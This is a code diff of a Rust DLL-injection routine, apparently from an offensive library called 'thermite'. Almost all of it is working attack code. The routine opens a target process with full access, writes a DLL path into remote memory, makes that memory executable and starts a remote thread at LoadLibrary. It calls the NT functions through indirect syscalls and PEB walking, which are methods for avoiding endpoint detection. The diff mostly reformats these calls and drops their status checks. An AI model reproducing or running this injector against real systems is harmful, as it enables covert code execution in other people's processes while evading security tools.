@@ -7,13 +7,12 @@ use std::ops::Not;
 use std::path::{Path, PathBuf};
 use std::ptr::null;
 
-use thermite::{debug, error, info, syscall_status};
+use thermite::{debug, error, info};
 use thermite::indirect_syscall as syscall;
-
+use thermite::models::windows::*;
 use thermite::models::windows::nt_status::NtStatus;
 use thermite::models::windows::peb_teb::UNICODE_STRING;
 use thermite::peb_walk::{get_function_address, get_module_address};
-use thermite::models::windows::*;
 
 
 /// Read the PID and the DLL Path from the program's command line arguments,
@@ -66,56 +65,47 @@ fn injector(pid: u32, dll_path: &str) {
 	};
 
 
-	let nt_status = syscall!(
-	    "NtOpenProcess",
+	syscall!("NtOpenProcess",
 	    &mut process_handle, //  [out]          PHANDLE            ProcessHandle,
 	    PROCESS_ALL_ACCESS,  //  [in]           ACCESS_MASK        DesiredAccess,
 	    &oa_process,         //  [in]           POBJECT_ATTRIBUTES ObjectAttributes,
-	    &client_id,          //  [in, optional] PCLIENT_ID         ClientId
-	);
-	syscall_status!("NtOpenProcess", nt_status);
+	    &client_id);         //  [in, optional] PCLIENT_ID         ClientId
+
 
 	let mut buf_size: usize = dll_path.len();
 	let mut base_addr: *mut c_void = 0u32 as _;
-	// process::exit(1);
-	let nt_status = syscall!(
-	    "NtAllocateVirtualMemory",
+
+	let nt_status = syscall!("NtAllocateVirtualMemory",
 	    process_handle,           // [in]      HANDLE   ProcessHandle,
 	    &mut base_addr,           // [in, out] PVOID    *BaseAddress,
 	    0u32,                     // [in]      PULONG   ZeroBits,
 	    &mut buf_size,            // [in, out] PSIZE_T  RegionSize,
 	    MEM_COMMIT | MEM_RESERVE, // [in]      ULONG    AllocationType,
-	    PAGE_READWRITE,           // [in]      ULONG    Protect
-	);
-	syscall_status!("NtAllocateVirtualMemory", nt_status);
+	    PAGE_READWRITE);          // [in]      ULONG    Protect
+
 	info!("Allocated {} bytes of memory at address {:#x?}", buf_size, base_addr);
 
 	// Copy the DLL Path to newly allocated memory
 	let mut bytes_written: usize = 0;
-	let nt_status = syscall!(
-	    "NtWriteVirtualMemory",
-	    process_handle,     // [in]              HANDLE    ProcessHandle,
-	    base_addr,          // [in]              PVOID     *BaseAddress,
-	    dll_path.as_ptr(),          // [in]              PVOID     Buffer,
-	    buf_size,           // [in]              ULONG     NumberOfBytesToWrite,
-	    &mut bytes_written  // [out, optional]   PULONG    NumberOfBytesWritten ,
-	);
-	syscall_status!("NtWriteVirtualMemory", nt_status);
+	syscall!("NtWriteVirtualMemory",
+	    process_handle,      // [in]            HANDLE ProcessHandle,
+	    base_addr,           // [in]            PVOID  *BaseAddress,
+	    dll_path.as_ptr(),   // [in]            PVOID  Buffer,
+	    buf_size,            // [in]            ULONG  NumberOfBytesToWrite,
+	    &mut bytes_written); // [out, optional] PULONG NumberOfBytesWritten ,
 
 	info!("Successfully written {} bytes in remote memory", buf_size);
 
 	// Change protection status of allocated memory to READ+EXECUTE
 	// let mut bytes_written = POP_CALC.len();
 	let mut old_protection = PAGE_READWRITE;
-	let nt_status = syscall!(
-	    "NtProtectVirtualMemory",
-	    process_handle,     // [in]              HANDLE    ProcessHandle,
-	    &mut base_addr,     // [in, out]         PVOID     *BaseAddress,
-	    &mut bytes_written, // [in, out]         PULONG    NumberOfBytesToProtect,
-	    PAGE_EXECUTE_READ,  // [in]              ULONG     NewAccessProtection,
-	    &mut old_protection,// [out]             PULONG    OldAccessProtection,
-	);
-	syscall_status!("NtProtectVirtualMemory", nt_status);
+	syscall!("NtProtectVirtualMemory",
+	    process_handle,      // [in]      HANDLE ProcessHandle,
+	    &mut base_addr,      // [in, out] PVOID  *BaseAddress,
+	    &mut bytes_written,  // [in, out] PULONG NumberOfBytesToProtect,
+	    PAGE_EXECUTE_READ,   // [in]      ULONG  NewAccessProtection,
+	    &mut old_protection);// [out]     PULONG OldAccessProtection,
+
 
 	let load_library_ptr = unsafe {
 		let kernel32_ptr = get_module_address("kernel32.dll").unwrap();
@@ -123,36 +113,30 @@ fn injector(pid: u32, dll_path: &str) {
 	};
 
 	// Create a remote thread in target process
-	let nt_status = syscall!(
-	    "NtCreateThreadEx",
-	    &mut thread_handle,    // [out]            PHANDLE ThreadHandle,
-	    GENERIC_EXECUTE,       // [in]             ACCESS_MASK DesiredAccess,
-	    null::<*mut c_void>(), // [in, optional]   POBJECT_ATTRIBUTES ObjectAttributes,
-	    process_handle,        // [in]             HANDLE ProcessHandle,
-	    load_library_ptr,      // [in, optional]   PVOID StartRoutine,
-	    base_addr,             // [in, optional]   PVOID Argument,
-	    0,                     // [in]             ULONG CreateFlags,
-	    null::<*mut c_void>(), // [in, optional]   ULONG_PTR ZeroBits,
-	    null::<*mut c_void>(), // [in, optional]   SIZE_T StackSize,
-	    null::<*mut c_void>(), // [in, optional]   SIZE_T MaximumStackSize,
-	    null::<*mut c_void>(), // [in, optional]   PVOID AttributeList
-	);
-	syscall_status!("NtCreateThreadEx", nt_status);
+	syscall!("NtCreateThreadEx",
+	    &mut thread_handle,    // [out]          PHANDLE ThreadHandle,
+	    GENERIC_EXECUTE,       // [in]           ACCESS_MASK DesiredAccess,
+	    null::<*mut c_void>(), // [in, optional] POBJECT_ATTRIBUTES ObjectAttributes,
+	    process_handle,        // [in]           HANDLE ProcessHandle,
+	    load_library_ptr,      // [in, optional] PVOID StartRoutine,
+	    base_addr,             // [in, optional] PVOID Argument,
+	    0,                     // [in]           ULONG CreateFlags,
+	    null::<*mut c_void>(), // [in, optional] ULONG_PTR ZeroBits,
+	    null::<*mut c_void>(), // [in, optional] SIZE_T StackSize,
+	    null::<*mut c_void>(), // [in, optional] SIZE_T MaximumStackSize,
+	    null::<*mut c_void>());// [in, optional] PVOID AttributeList
+
 
 	// Wait for the thread to execute
 	// Timeout is a null pointer, so we wait indefinitely
-	let nt_status = syscall!(
-	    "NtWaitForSingleObject",
+	syscall!("NtWaitForSingleObject",
 	    thread_handle,          //  [in] HANDLE         Handle,
 	    0,                      //  [in] BOOLEAN        Alertable,
-	    null::<*mut c_void>()   //  [in] PLARGE_INTEGER Timeout
-	);
-	syscall_status!("NtWaitForSingleObject", nt_status);
+	    null::<*mut u64>());    //  [in] PLARGE_INTEGER Timeout
+
 
 	// Close the handle
-	let nt_status = syscall!(
-	    "NtClose",
-	    thread_handle // [in] HANDLE Handle
-	);
-	syscall_status!("NtClose", nt_status);
+	syscall!("NtClose",
+	    thread_handle); // [in] HANDLE Handle
+
 }
